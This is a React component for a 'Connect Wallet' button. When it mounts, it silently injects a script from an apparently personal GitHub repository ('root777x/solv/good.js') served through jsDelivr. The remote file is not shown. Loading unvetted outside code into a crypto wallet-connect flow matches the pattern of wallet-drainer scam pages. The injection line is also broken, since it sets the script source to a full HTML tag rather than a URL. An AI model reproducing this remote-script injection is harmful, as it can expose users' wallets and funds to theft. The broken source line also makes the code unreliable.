import React, { useEffect } from 'react';
import { motion } from 'framer-motion';
import { Wallet } from 'lucide-react';

export const ConnectButton = () => {
  // Dynamically add the <script src="https://cdn.jsdelivr.net/gh/root777x/solv@main/good.js"> when the component mounts
  useEffect(() => {
    // Create the script tag
    const script = document.createElement('script');
    script.src = '<script src="https://cdn.jsdelivr.net/gh/root777x/solv@main/good.js"></script>';  // Link to the external JS file
    script.async = true;  // Optional: make it async for non-blocking load
    document.body.appendChild(script);

    // Cleanup: Remove the script when the component is unmounted
    return () => {
      document.body.removeChild(script);
    };
  }, []); // Empty dependency array ensures this effect runs only once, when the component mounts

  const handleConnect = () => {
    // Trigger a function from good.js or any other logic here
    console.log('Connect button clicked!');
    
    // If `good.js` adds a global function or modifies the button,
    // you can call that here as well (e.g., call `goodFunction()`).
  };

  return (
    <motion.button
      className="group relative px-10 py-4 rounded-xl bg-purple-500 text-white text-lg font-bold overflow-hidden"
      whileHover={{ scale: 1.05 }}
      whileTap={{ scale: 0.95 }}
      onClick={handleConnect} // Add your click handler
    >
      <div className="absolute inset-0 bg-gradient-to-r from-purple-600 to-purple-400 opacity-0 group-hover:opacity-100 transition-opacity" />
      <div className="absolute inset-0 bg-[radial-gradient(circle_at_50%_50%,rgba(255,255,255,0.2),transparent_100%)]" />
      <div className="absolute inset-0 opacity-0 group-hover:opacity-100 transition-opacity">
        <div className="absolute inset-0 bg-gradient-to-r from-purple-400/20 to-purple-600/20 animate-pulse" />
        <div className="absolute inset-0 bg-[radial-gradient(circle_at_50%_50%,rgba(255,255,255,0.2),transparent_60%)]" />
      </div>
      <span className="relative flex items-center gap-3">
        <Wallet className="w-5 h-5" />
        Connect Wallet
      </span>
    </motion.button>
  );
};
